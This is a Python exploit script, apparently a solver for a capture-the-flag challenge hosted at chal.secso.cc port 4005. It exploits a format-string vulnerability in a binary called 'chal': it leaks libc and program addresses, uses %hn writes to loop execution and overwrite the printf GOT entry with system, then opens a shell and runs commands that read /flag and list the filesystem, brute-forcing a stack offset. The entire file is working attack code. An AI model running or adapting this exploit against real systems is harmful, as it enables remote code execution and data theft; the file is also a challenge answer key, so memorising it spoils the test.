import socket, subprocess, sys, time, re

CFG = {
 'local':  dict(ARGVPTR=21, ARGV=57, ARGV_OFF=0x138, CP1=(43,0x3dd8), CP2=(48,0x1080),
                MAIN_IDX=44, RETOFF=0x27781, LOOPB=0x64, SYSTEM=0x54740, PRINTF=0x5b8b0, ORACLE=26, RBP_LOW4=0x0),
 'remote': dict(ARGVPTR=24, ARGV=53, ARGV_OFF=0x118, CP1=(41,0x3dd8), CP2=(45,0x1080),
                MAIN_IDX=21, RETOFF=0x29ca8, LOOPB=0xa1, SYSTEM=0x53110, PRINTF=0x59900, ORACLE=50, RBP_LOW4=0x0),
}
GOT_PRINTF=0x4008; MAIN_OFF=0x1169

class Tube:
    def __init__(self, mode, host=None):
        self.mode=mode; self.buf=b""
        if mode=='local':
            self.p=subprocess.Popen(["./chal"],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.DEVNULL)
        else:
            self.s=socket.create_connection(host,timeout=30)
    def _recv(self):
        c=self.p.stdout.read1(65536) if self.mode=='local' else self.s.recv(65536)
        if not c: raise EOFError("eof")
        return c
    def until(self,tok,lim=90):
        t0=time.time()
        while tok not in self.buf:
            if time.time()-t0>lim: raise TimeoutError(repr(tok))
            self.buf+=self._recv()
        i=self.buf.index(tok)+len(tok); o=self.buf[:i]; self.buf=self.buf[i:]; return o
    def send(self,d):
        if self.mode=='local': self.p.stdin.write(d); self.p.stdin.flush()
        else: self.s.sendall(d)
    def close(self):
        try: self.p.kill() if self.mode=='local' else self.s.close()
        except Exception: pass

def pad(n):
    n%=0x10000
    if n==0: n=0x10000
    return b"%%1$%dc"%n, n%0x10000

def seq(targets):
    """cumulative %hn targets -> pad strings"""
    out=[]; cur=0
    for t in targets:
        p,adv=pad((t-cur)%0x10000); out.append(p); cur=(cur+adv)%0x10000
    return out

def go(mode, guess, host=None, cmd=b"cat /flag; cat /flag.txt; ls -la /; id\n", verbose=True):
    C=CFG[mode]; t=Tube(mode,host); log=(lambda *a: verbose and print(*a))
    AP,AV=C['ARGVPTR'],C['ARGV']
    W_AV  = b"%%%d$hn"%AV;  W_AVB = b"%%%d$hhn"%AV;  W_AP = b"%%%d$hn"%AP
    def iterate(buf1,buf2,idx=b"1\n",last=False):
        t.send(idx); t.until(b"Enter the first input to be echoed: ")
        assert len(buf1)<=31, "buf1 %d: %r"%(len(buf1),buf1)
        t.send(buf1+b"\n"); t.until(b"Enter the second input to be echoed: ")
        assert len(buf2)<=31, "buf2 %d: %r"%(len(buf2),buf2)
        t.send(buf2+b"\n")
        if last: return None
        blob=t.until(b"Enter an index: ",lim=120)
        j=blob.index(b"Echoed output: \n")+len(b"Echoed output: \n")
        return blob[j:]
    try:
        t.until(b"Enter an index: ")
        # ---------- iter 1 : oracle -> aim P_A=&retaddr, arm loop ----------
        t.send(b"%d\n"%C['ORACLE'])
        ob=int(re.search(rb"0x([0-9a-f]+)",t.until(b"Enter the first input to be echoed: ")).group(1),16)
        # oracle = byte1(argv_addr); solve exactly for rbp's low 16 bits.
        rbp_lo=0x10*guess+C['RBP_LOW4']
        K=rbp_lo+C['ARGV_OFF']
        b1=(ob-(K>>8))&0xff
        rbp_lo16=(b1<<8)|rbp_lo
        ret_lo16=(rbp_lo16+8)&0xffff
        buf1=b"%%19$p%%%d$p"%AP+seq([ret_lo16-28])[0]+W_AP
        assert len(buf1)<=31,len(buf1)
        t.send(buf1+b"\n"); t.until(b"Enter the second input to be echoed: ")
        t.send(pad(C['LOOPB'])[0]+W_AVB+b"\n")
        blob=t.until(b"Enter an index: ",lim=120)
        j=blob.index(b"Echoed output: \n")+len(b"Echoed output: \n")
        hx=re.findall(rb"0x([0-9a-f]{12})",blob[j:j+40])
        ret=int(hx[0],16); argv=int(hx[1],16)
        libc=ret-C['RETOFF']; rbp=argv-C['ARGV_OFF']
        assert libc&0xfff==0, "libc misaligned %#x"%libc
        assert (rbp+8)&0xffff==ret_lo16, "guess mismatch"
        assert rbp&0xffff==rbp_lo16
        log("  [1] loop armed. libc=%#x rbp=%#x"%(libc,rbp))
        retaddr=rbp+8
        cp1a=rbp+0x10+(C['CP1'][0]-20)*8
        cp2a=rbp+0x10+(C['CP2'][0]-20)*8
        # ---------- iter 2 : re-arm + aim P_A=cp1slot ; leak chal ----------
        p=seq([C['LOOPB'], cp1a&0xffff])
        out=iterate(p[0]+W_AVB+p[1]+W_AP, b"%%%d$p%%%d$p%%%d$p"%(C['MAIN_IDX'],C['CP1'][0],C['CP2'][0]))
        hx=re.findall(rb"0x([0-9a-f]{12})",out[-60:])
        mainp,cp1v,cp2v=[int(x,16) for x in hx[-3:]]
        chal=mainp-MAIN_OFF; got=chal+GOT_PRINTF; system=libc+C['SYSTEM']
        assert chal&0xfff==0,"chal misaligned %#x"%chal
        assert cp1v==chal+C['CP1'][1] and cp2v==chal+C['CP2'][1],"cp slots moved"
        assert (cp1v>>16)==(got>>16) and (cp2v>>16)==((got+2)>>16),"GOT 64K block mismatch"
        assert (system>>32)==((libc+C['PRINTF'])>>32),"libc high-half carry"
        log("  [2] chal=%#x got=%#x system=%#x"%(chal,got,system))
        # ---------- iter 3 : CP1 -> got ; re-arm ; aim P_A=cp2slot ----------
        p=seq([got&0xffff, retaddr&0xffff]); q=seq([C['LOOPB'], cp2a&0xffff])
        iterate(p[0]+W_AV+p[1]+W_AP, q[0]+W_AVB+q[1]+W_AP)
        log("  [3] CP1 -> GOT")
        # ---------- iter 4 : CP2 -> got+2 ; re-arm ----------
        p=seq([(got+2)&0xffff, retaddr&0xffff])
        iterate(p[0]+W_AV+p[1]+W_AP, pad(C['LOOPB'])[0]+W_AVB)
        log("  [4] CP2 -> GOT+2")
        # ---------- iter 5 : GOT[printf]=system ; buf2 -> system("sh") ----------
        p=seq([system&0xffff,(system>>16)&0xffff])
        b1=p[0]+b"%%%d$hn"%C['CP1'][0]+p[1]+b"%%%d$hn"%C['CP2'][0]
        iterate(b1, b"sh", last=True)
        log("  [5] GOT patched -> firing shell")
        time.sleep(1.5); t.send(cmd); time.sleep(1.0); t.send(b"echo ___END___\n")
        data=b""; t0=time.time()
        while time.time()-t0<15:
            try:
                if mode!='local': t.s.settimeout(3)
                data+=t._recv()
            except Exception: break
            if b"___END___" in data: break
        txt=re.sub(rb" {4,}",b" ",data)
        print("---- shell output ----"); print(txt[-2500:].decode('latin1'))
        m=re.search(rb"K17\{[^}]*\}",data)
        if m: print("\n*** FLAG: %s ***"%m.group(0).decode()); return m.group(0)
        return b"___END___" in data or None
    finally:
        t.close()

if __name__=="__main__":
    mode=sys.argv[1]
    host=("chal.secso.cc",4005)
    gs=[int(sys.argv[2])] if len(sys.argv)>2 else range(16)
    for g in gs:
        try:
            r=go(mode,g,host)
            if r: print("[+] WIN guess=%d"%g); break
        except Exception as e:
            print("[-] g=%d %s: %s"%(g,type(e).__name__,e))
